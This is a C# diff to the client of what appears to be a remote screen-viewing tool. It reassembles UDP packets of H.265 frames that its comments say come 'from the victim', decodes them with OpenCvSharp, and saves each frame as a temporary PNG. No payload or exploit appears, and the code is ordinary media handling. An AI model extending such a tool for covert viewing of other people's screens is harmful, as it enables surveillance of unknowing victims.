@@ -13,6 +13,8 @@ using System.Windows;
 using System.Threading;
 using System.Net;
 using System.Net.Sockets;
+using OpenCvSharp;
+using System.Drawing;
 
 namespace ExtremLink_Client.Classes
 {
@@ -55,6 +57,12 @@ namespace ExtremLink_Client.Classes
                 }
                 return attackerInstance;
             }
+        }
+
+        private string tempPngFileName;
+        public string TempPngFileName
+        {
+            get { return this.tempPngFileName; }
         }
 
 
@@ -210,7 +218,9 @@ namespace ExtremLink_Client.Classes
             // & - Frames handling.
             while (true)
             {
-                this.currentFrame = this.GetFrame();
+                byte[] currentFrameByteArr = this.GetFrame();
+                this.currentFrame = this.ConvertByteArrayToBitmapImage(currentFrameByteArr);
+                this.InsertBitmapImageToPngFile(this.currentFrame);
                 Thread.Sleep(1000);
             }
         }
@@ -289,105 +299,168 @@ namespace ExtremLink_Client.Classes
         }
 
 
-        
+
         // Getting frames functions:
-        public BitmapImage GetFrame()
+        public byte[] GetFrame()
+        {
+            // Input: Nothing.
+            // Output: The function gets a frame from the victim as a byte array in h265 format.
+            Dictionary<int, byte[]> receivedPackets = new Dictionary<int, byte[]>();
+            int streamId = -1;
+            int totalPackets = -1;
+
+            // Receive packets
+            while (receivedPackets.Count < totalPackets || totalPackets == -1)
+            {
+                // Buffer size for each packet
+                byte[] buffer = new byte[1412]; // 1400 + 12 bytes for metadata
+                int bytesRead = this.udpSocket.Receive(buffer);
+
+                // Extract metadata
+                int receivedStreamId = BitConverter.ToInt32(buffer, 0);
+                int receivedTotalPackets = BitConverter.ToInt32(buffer, 4);
+                int packetIndex = BitConverter.ToInt32(buffer, 8);
+
+                // Ensure packets are part of the same stream
+                if (streamId == -1) streamId = receivedStreamId;
+                if (totalPackets == -1) totalPackets = receivedTotalPackets;
+                if (streamId != receivedStreamId) continue;
+
+                // Extract segment data
+                byte[] segmentData = new byte[bytesRead - 12];
+                Array.Copy(buffer, 12, segmentData, 0, bytesRead - 12);
+
+                // Store segment if not already received
+                if (!receivedPackets.ContainsKey(packetIndex))
+                {
+                    receivedPackets[packetIndex] = segmentData;
+                }
+            }
+            using (var ms = new MemoryStream())
+            {
+                for (int i = 0; i < totalPackets; i++)
+                {
+                    if (receivedPackets.TryGetValue(i, out var segment))
+                    {
+                        ms.Write(segment, 0, segment.Length);
+                    }
+                    else
+                    {
+                        throw new Exception($"Missing packet {i}");
+                    }
+                }
+                return ms.ToArray();
+            }
+        }
+        public BitmapImage ConvertByteArrayToBitmapImage(byte[] h265Bytes)
         {
             try
             {
-                // Store received packets
-                Dictionary<int, byte[]> receivedPackets = new Dictionary<int, byte[]>();
-                int streamId = -1;
-                int totalPackets = -1;
+                // Write the byte array to a temporary file since VideoCapture needs a file or stream
+                string tempFile = Path.GetTempFileName() + ".h265";
+                File.WriteAllBytes(tempFile, h265Bytes);
 
-                // Receive packets
-                while (receivedPackets.Count < totalPackets || totalPackets == -1)
+                // Open the video file using VideoCapture
+                using (var videoCapture = new VideoCapture(tempFile))
                 {
-                    // Buffer size for each packet
-                    byte[] buffer = new byte[1412]; // 1400 + 12 bytes for metadata
-                    
-                    
-                    int bytesRead = this.udpSocket.Receive(buffer);
+                    if (!videoCapture.IsOpened())
+                        throw new Exception("Could not open video file");
 
-
-                    // Extract metadata
-                    int receivedStreamId = BitConverter.ToInt32(buffer, 0);
-                    int receivedTotalPackets = BitConverter.ToInt32(buffer, 4);
-                    int packetIndex = BitConverter.ToInt32(buffer, 8);
-
-                    // Ensure packets are part of the same stream
-                    if (streamId == -1) streamId = receivedStreamId;
-                    if (totalPackets == -1) totalPackets = receivedTotalPackets;
-                    if (streamId != receivedStreamId) continue;
-
-                    // Extract segment data
-                    byte[] segmentData = new byte[bytesRead - 12];
-                    Array.Copy(buffer, 12, segmentData, 0, bytesRead - 12);
-
-                    // Store segment if not already received
-                    if (!receivedPackets.ContainsKey(packetIndex))
+                    // Read the first frame
+                    using (var frame = new Mat())
                     {
-                        receivedPackets[packetIndex] = segmentData;
-                    }
-                }
+                        if (!videoCapture.Read(frame) || frame.Empty())
+                            throw new Exception("Could not read frame from video");
 
-                // Reassemble the file content
-                using (var fileStream = new FileStream("tempFrame.png", FileMode.Create))
-                {
-                    for (int i = 0; i < totalPackets; i++)
-                    {
-                        if (receivedPackets.TryGetValue(i, out var segment))
+                        // Convert the frame (BGR) to RGB
+                        using (var rgbFrame = new Mat())
                         {
-                            fileStream.Write(segment, 0, segment.Length);
-                        }
-                        else
-                        {
-                            throw new Exception($"Missing packet {i}");
+                            Cv2.CvtColor(frame, rgbFrame, ColorConversionCodes.BGR2RGB);
+
+                            // Convert Mat to byte array
+                            byte[] imageData = rgbFrame.ToBytes(".bmp"); // Use BMP format for simplicity
+
+                            // Create BitmapImage from byte array
+                            BitmapImage bitmap = new BitmapImage();
+                            using (var ms = new MemoryStream(imageData))
+                            {
+                                bitmap.BeginInit();
+                                bitmap.CacheOption = BitmapCacheOption.OnLoad;
+                                bitmap.StreamSource = ms;
+                                bitmap.EndInit();
+                                bitmap.Freeze(); // Make it usable across threads
+                            }
+
+                            // Clean up temporary file
+                            File.Delete(tempFile);
+
+                            return bitmap;
                         }
                     }
                 }
+            }
+            catch (Exception ex)
+            {
+                throw new Exception($"Error converting H.265 to BitmapImage: {ex.Message}");
+            }
+        }
+        public string InsertBitmapImageToPngFile(BitmapImage frame)
+        {
+            // Input: A BitmapImage object which contains an image.
+            // Output: The function creates a png file, inserts the given BitmapImage to the png file and returns it name.
+            if (frame == null)
+                throw new ArgumentNullException(nameof(frame), "BitmapImage cannot be null");
 
-                // Load the PNG file to a BitmapImage object
-                var bitmap = new BitmapImage();
-                using (var stream = new FileStream("tempFrame.png", FileMode.Open, FileAccess.Read))
+            // Create a PNG encoder
+            PngBitmapEncoder encoder = new PngBitmapEncoder();
+
+            // Add the BitmapImage to the encoder
+            encoder.Frames.Add(BitmapFrame.Create(frame));
+
+            // Generate a unique file name with timestamp
+            string fileName = $"tempFrame.png";
+            string filePath = Path.Combine(Path.GetTempPath(), fileName);
+
+            try
+            {
+                // Save the encoded image to a file
+                using (FileStream fs = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                 {
-                    bitmap.BeginInit();
-                    bitmap.CacheOption = BitmapCacheOption.None;
-                    bitmap.StreamSource = stream;
-                    bitmap.EndInit();
+                    encoder.Save(fs);
                 }
-                bitmap.Freeze();
+
+                return fileName;
+            }
+            catch (Exception ex)
+            {
+                throw new IOException($"Failed to create PNG file from BitmapImage: {ex.Message}", ex);
+            }
+        }
+        public BitmapImage GetBitmapImageFromPNGFile(string pngFileName)
+        {
+            // Input: A string which represent the path of a png file.
+            // Output: A BitmapImage which represent the image of the given png file.
+            if (string.IsNullOrEmpty(pngFileName))
+                throw new ArgumentException("PNG file name cannot be null or empty", nameof(pngFileName));
+
+            if (!File.Exists(pngFileName))
+                throw new FileNotFoundException($"The specified PNG file does not exist: {pngFileName}", pngFileName);
+
+            try
+            {
+                BitmapImage bitmap = new BitmapImage();
+                bitmap.BeginInit();
+                bitmap.UriSource = new Uri(pngFileName, UriKind.Absolute); // Use absolute path
+                bitmap.CacheOption = BitmapCacheOption.OnLoad; // Load immediately into memory
+                bitmap.EndInit();
+                bitmap.Freeze(); // Make it immutable and thread-safe
+
                 return bitmap;
-
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"An error occurred: {ex.Message}");
-                return null;
+                throw new InvalidOperationException($"Failed to load PNG file into BitmapImage: {ex.Message}", ex);
             }
         }
-        public BitmapImage GetImageOfPNGFile(string fileName)
-        {
-            // Load the PNG file as a BitmapImage
-            BitmapImage bitmapImage = new BitmapImage();
-            try
-            {
-                using (var stream = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-                {
-                    bitmapImage.BeginInit();
-                    bitmapImage.CacheOption = BitmapCacheOption.OnLoad; // Load the data into memory immediately
-                    bitmapImage.StreamSource = stream; // Use the FileStream as the source
-                    bitmapImage.EndInit();
-                    bitmapImage.Freeze(); // Make the BitmapImage thread-safe
-                }
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show($"Error loading frame: {ex.Message}");
-            }
-
-            return bitmapImage;
-        }
-
     }
 }
